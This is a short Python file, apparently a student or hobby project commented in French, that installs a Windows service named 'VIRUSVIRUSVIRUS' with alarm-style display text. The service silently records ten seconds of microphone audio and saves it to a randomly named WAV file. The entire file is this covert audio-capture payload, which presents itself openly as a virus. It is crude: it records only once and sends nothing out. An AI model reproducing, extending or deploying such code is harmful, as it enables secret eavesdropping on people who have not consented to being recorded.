import time
import random
from pathlib import Path
from SMWinservice import SMWinservice
import sounddevice as sd
from scipy.io.wavfile import write

class PythonCornerExample(SMWinservice):
    _svc_name_ = "VIRUSVIRUSVIRUS"
    _svc_display_name_ = "WARNINGWARNINGWARNINGWARNING"
    _svc_description_ = "WE ARE UNDER ATTAAAAAAAAACK"

    def start(self):
        self.isrunning = True

    def stop(self):
        self.isrunning = False

    def main(self): #c'est la qu'on ecrit le déroulement du programme
        random.seed()
        x= random.randint(1,1000000)
        fs = 44100 #fréquence d'échantillonnage
        sec = 10 #durée de l'enregistrement 

        record = sd.rec(int(sec * fs), samplerate=fs, channels=2)
        sd.wait() 
        chemin = "output"+str(x)+".wav"
        write(chemin, fs, record)
        time.sleep(10)
        

if __name__ == '__main__':
    PythonCornerExample.parse_command_line()